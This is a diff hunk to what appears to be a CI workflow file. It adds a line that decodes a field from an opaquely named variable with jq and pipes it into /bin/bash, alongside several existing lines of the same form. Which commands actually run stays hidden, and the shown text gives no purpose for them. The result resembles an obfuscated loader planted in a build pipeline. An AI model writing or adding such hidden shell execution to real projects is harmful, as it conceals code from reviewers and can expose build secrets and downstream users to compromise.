@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$k2535" | jq -r .tqbp037 | /bin/bash
           echo $i911 | jq -r .trql687 | /bin/bash
           echo $tt32543 | jq -r .ojdk64598 | /bin/bash
+          printf '%s' "$k56" | jq -r .orvf4 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
